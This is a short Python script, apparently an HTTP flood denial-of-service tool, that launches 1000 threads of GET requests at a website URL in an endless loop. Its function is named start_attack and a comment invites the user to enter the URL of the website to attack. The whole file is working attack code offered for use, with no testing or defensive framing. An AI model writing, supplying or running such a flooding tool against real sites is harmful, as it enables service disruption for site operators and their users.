import requests
import threading


def send_request(url):
    try:
        response = requests.get(url)
        print(f"Request sent, status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")


def start_attack(url, num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request, args=(url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    url = "URL" # input the url of website you want to perform attack.
    num_threads = 1000  

    while True:
        start_attack(url, num_threads)
